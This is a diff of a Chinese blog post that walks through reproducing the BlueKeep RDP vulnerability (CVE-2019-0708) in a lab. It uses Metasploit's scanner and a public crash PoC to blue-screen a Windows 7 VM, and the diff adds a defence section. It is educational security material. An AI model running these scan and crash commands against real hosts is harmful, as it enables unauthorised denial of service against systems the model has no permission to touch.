@@ -28,25 +28,25 @@
 <meta property="og:site_name" content="v5le0n9&#39;s garden">
 <meta property="og:description" content="终于来到了这一步，你你你，就是我第一个复现的漏洞啦！">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/posts/undefined/2.2.1.png">
-<meta property="og:image" content="http://example.com/posts/undefined/2.2.2.png">
-<meta property="og:image" content="http://example.com/posts/undefined/2.2.3.png">
-<meta property="og:image" content="http://example.com/posts/undefined/2.2.4.png">
-<meta property="og:image" content="http://example.com/posts/undefined/2.2.5.png">
-<meta property="og:image" content="http://example.com/posts/undefined/2.2.6.png">
-<meta property="og:image" content="http://example.com/posts/undefined/2.2.7.png">
-<meta property="og:image" content="http://example.com/posts/undefined/2.2.8.png">
-<meta property="og:image" content="http://example.com/posts/undefined/2.2.9.png">
-<meta property="og:image" content="http://example.com/posts/undefined/2.2.10.png">
-<meta property="og:image" content="http://example.com/posts/undefined/2.2.12.png">
-<meta property="og:image" content="http://example.com/posts/undefined/2.2.11.png">
-<meta property="og:image" content="http://example.com/posts/undefined/2.2.13.png">
+<meta property="og:image" content="http://example.com/posts/2d03ac3f/2.2.1.png">
+<meta property="og:image" content="http://example.com/posts/2d03ac3f/2.2.2.png">
+<meta property="og:image" content="http://example.com/posts/2d03ac3f/2.2.3.png">
+<meta property="og:image" content="http://example.com/posts/2d03ac3f/2.2.4.png">
+<meta property="og:image" content="http://example.com/posts/2d03ac3f/2.2.5.png">
+<meta property="og:image" content="http://example.com/posts/2d03ac3f/2.2.6.png">
+<meta property="og:image" content="http://example.com/posts/2d03ac3f/2.2.7.png">
+<meta property="og:image" content="http://example.com/posts/2d03ac3f/2.2.8.png">
+<meta property="og:image" content="http://example.com/posts/2d03ac3f/2.2.9.png">
+<meta property="og:image" content="http://example.com/posts/2d03ac3f/2.2.10.png">
+<meta property="og:image" content="http://example.com/posts/2d03ac3f/2.2.12.png">
+<meta property="og:image" content="http://example.com/posts/2d03ac3f/2.2.11.png">
+<meta property="og:image" content="http://example.com/posts/2d03ac3f/2.2.13.png">
 <meta property="article:published_time" content="2022-05-24T07:28:42.637Z">
-<meta property="article:modified_time" content="2022-05-24T15:14:09.189Z">
+<meta property="article:modified_time" content="2022-05-25T00:49:59.431Z">
 <meta property="article:author" content="v5le0n9">
 <meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/posts/undefined/2.2.1.png">
+<meta name="twitter:image" content="http://example.com/posts/2d03ac3f/2.2.1.png">
 
 <link rel="canonical" href="http://example.com/posts/2d03ac3f.html">
 
@@ -227,10 +227,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-05-24 15:28:42 / 修改时间：23:14:09" itemprop="dateCreated datePublished" datetime="2022-05-24T15:28:42+08:00">2022-05-24</time>
+              <time title="创建时间：2022-05-24 15:28:42" itemprop="dateCreated datePublished" datetime="2022-05-24T15:28:42+08:00">2022-05-24</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-05-25 08:49:59" itemprop="dateModified" datetime="2022-05-25T08:49:59+08:00">2022-05-25</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -254,7 +260,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>2.3k</span>
+              <span>2.5k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -289,52 +295,60 @@
 <li>Payload：有效载荷，指的是Exploit执行成功之后，在系统中进行恶意操作的代码或者指令。</li>
 <li>Shellcode：简单翻译就是shell代码，是payload的一种，因为建立正反shell而得名。Shellcode是一段利用软件漏洞执行的代码，Shellcode为16进制的机器码， 可在寄存器eip溢出后，塞入一段让CPU执行的Shellcode机器码，让电脑可以执行攻击者的任意指令。</li>
 </ul>
-<h1 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2. 漏洞复现"></a>2. 漏洞复现</h1><h2 id="2-1-环境配置"><a href="#2-1-环境配置" class="headerlink" title="2.1 环境配置"></a>2.1 环境配置</h2><p>攻击机：Kali Linux x64（IP地址：192.168.193.128）</p>
+<h1 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h1><h2 id="3-1-环境配置"><a href="#3-1-环境配置" class="headerlink" title="3.1 环境配置"></a>3.1 环境配置</h2><p>攻击机：Kali Linux x64（IP地址：192.168.193.128）</p>
 <p>靶机：Windows 7  x86 旗舰版（IP地址：192.168.193.140）</p>
 <p>利用工具：MSF</p>
 <p>POC：<a target="_blank" rel="noopener" href="https://github.com/n1xbyte/CVE-2019-0708">https://github.com/n1xbyte/CVE-2019-0708</a></p>
-<h2 id="2-2-漏洞复现"><a href="#2-2-漏洞复现" class="headerlink" title="2.2 漏洞复现"></a>2.2 漏洞复现</h2><p>1.在靶机中设置远程桌面连接：</p>
-<img src="/posts/undefined/2.2.1.png" class="" title="设置远程桌面连接">
+<h2 id="3-2-漏洞复现"><a href="#3-2-漏洞复现" class="headerlink" title="3.2 漏洞复现"></a>3.2 漏洞复现</h2><p>1.在靶机中设置远程桌面连接：</p>
+<img src="/posts/2d03ac3f/2.2.1.png" class="" title="设置远程桌面连接">
 <p>2.开启公用文件夹共享：</p>
-<img src="/posts/undefined/2.2.2.png" class="" title="开启公用文件夹共享">
+<img src="/posts/2d03ac3f/2.2.2.png" class="" title="开启公用文件夹共享">
 <p>3.在Windows 防火墙开启3389端口：</p>
-<img src="/posts/undefined/2.2.3.png" class="" title="开启3389端口">
+<img src="/posts/2d03ac3f/2.2.3.png" class="" title="开启3389端口">
 <p>4.在攻击机中更新应用，安装MSF：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get upgrade</span><br><span class="line">apt-get install metasploit-framework</span><br></pre></td></tr></table></figure>
 <p>有关MSF的知识可以看<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45677145/article/details/111540117">MSF详解</a>，Metasploit 是一个开源的渗透测试开源软件，也是一个逐步发展成熟的漏洞研究与渗透测试代码开发平台，此外也将成为支持整个渗透测试过程的安全技术集成开发与应用环境。</p>
 <p>5.验证靶机是否开启了3389端口：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.193.140</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/2.2.4.png" class="" title="扫描靶机是否开启3389端口">
+<img src="/posts/2d03ac3f/2.2.4.png" class="" title="扫描靶机是否开启3389端口">
 <p>6.在确认开启了3389端口后执行MSF进行漏洞扫描：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/2.2.5.png" class="" title="进入MSF">
+<img src="/posts/2d03ac3f/2.2.5.png" class="" title="进入MSF">
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reload_all</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/2.2.6.png" class="" title="重新加载所有模块">
+<img src="/posts/2d03ac3f/2.2.6.png" class="" title="重新加载所有模块">
 <p>7.寻找可利用的工具，可以找到如下工具进行探测：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search 0708</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/2.2.7.png" class="" title="启用模块">
+<img src="/posts/2d03ac3f/2.2.7.png" class="" title="启用模块">
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</span><br><span class="line">show options</span><br></pre></td></tr></table></figure>
 <p>启用0708RDP攻击模块，查看相关信息和设置。</p>
 <p>8.设置参数并进行检测：</p>
 <p>设置rhost为靶机IP，可以发现存在可利用漏洞。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set rhost 192.168.193.140</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/2.2.8.png" class="" title="检测靶机是否存在可利用漏洞">
+<img src="/posts/2d03ac3f/2.2.8.png" class="" title="检测靶机是否存在可利用漏洞">
 <p>9.安装pip3和impacket库</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python3-pip</span><br><span class="line">pip3 install impacket</span><br></pre></td></tr></table></figure>
-<img src="/posts/undefined/2.2.9.png" class="" title="安装pip3和impacket库">
+<img src="/posts/2d03ac3f/2.2.9.png" class="" title="安装pip3和impacket库">
 <p>10.下载POC，修改脚本权限</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n1xbyte/CVE-2019-0708.git</span><br></pre></td></tr></table></figure>
 <p>进去该目录看看里面有什么文件以及它们的权限。发现它们没有执行权限。</p>
-<img src="/posts/undefined/2.2.10.png" class="" title="POC包含的文件">
+<img src="/posts/2d03ac3f/2.2.10.png" class="" title="POC包含的文件">
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 crashpoc.py</span><br></pre></td></tr></table></figure>
 <p>chmod表示change mod，修改文件属性；<code>crashpoc.py</code>表示所要修改的文件；777表示权限列表，每个“7”表示一组，共三组。“r—”二进制表示“100”，其值为4；而“rwx”表示“111”，其值为7，即所有权限都开启。</p>
-<img src="/posts/undefined/2.2.12.png" class="" title="修改文件权限">
-<p>打开<code>crashpoc.py</code>和<code>poc.py</code>发现都需要impacket库支持，也就是为什么第9步要进行安装impacket库。</p>
-<img src="/posts/undefined/2.2.11.png" class="" title="POC包含的文件">
+<img src="/posts/2d03ac3f/2.2.12.png" class="" title="修改文件权限">
+<p>打开<code>crashpoc.py</code>和<code>poc.py</code>发现都需要impacket库支持，也就是为什么第9步要进行安装impacket库。可用<code>pip3 list</code>命令查看Python安装的所有扩展包。</p>
+<img src="/posts/2d03ac3f/2.2.11.png" class="" title="POC包含的文件">
 <p>11.利用脚本进行攻击</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 crashpoc.py 192.168.193.140 32</span><br><span class="line">#IP地址 目标IP地址主机的系统版本</span><br></pre></td></tr></table></figure>
 <p>靶机蓝屏，攻击成功。</p>
-<img src="/posts/undefined/2.2.13.png" class="" title="靶机蓝屏">
+<img src="/posts/2d03ac3f/2.2.13.png" class="" title="靶机蓝屏">
+<h1 id="4-防御方法"><a href="#4-防御方法" class="headerlink" title="4. 防御方法"></a>4. 防御方法</h1><ul>
+<li>微软官方已经发布更新补丁(包括Windows XP等停止维护的版本)，请用户及时进行补丁更新</li>
+<li>若用户不需要用到远程桌面服务，建议禁用该服务</li>
+<li>在防火墙中对TCP 3389端口进行阻断</li>
+<li>开启系统防火墙或IP安全策略限制来源IP，即只允许指定IP访问</li>
+<li>启用网络级认证(NLA)，此方案适用于Windows 7 、 Windows Server 2008 和 Windows Server 2008 R2</li>
+<li>安装必要的防火墙或杀毒软件，关注安全公司的漏洞报告或防御文章</li>
+</ul>
 
     </div>
 
@@ -437,7 +451,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="nav-text">1. 漏洞背景</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-text">1.1 漏洞概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="nav-text">1.2 影响范围</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-%E5%BD%B1%E5%93%8D%E6%96%B9%E5%BC%8F"><span class="nav-text">1.3 影响方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-4-%E6%BC%8F%E6%B4%9E%E8%AF%84%E7%BA%A7"><span class="nav-text">1.4 漏洞评级</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-text">2. 前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-RDP%E5%8D%8F%E8%AE%AE"><span class="nav-text">2.1 RDP协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD"><span class="nav-text">2.2 专业术语</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">2. 漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-text">2.1 环境配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">2.2 漏洞复现</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="nav-text">1. 漏洞背景</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-text">1.1 漏洞概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="nav-text">1.2 影响范围</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-%E5%BD%B1%E5%93%8D%E6%96%B9%E5%BC%8F"><span class="nav-text">1.3 影响方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-4-%E6%BC%8F%E6%B4%9E%E8%AF%84%E7%BA%A7"><span class="nav-text">1.4 漏洞评级</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-text">2. 前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-RDP%E5%8D%8F%E8%AE%AE"><span class="nav-text">2.1 RDP协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD"><span class="nav-text">2.2 专业术语</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">3. 漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-text">3.1 环境配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">3.2 漏洞复现</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="nav-text">4. 防御方法</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
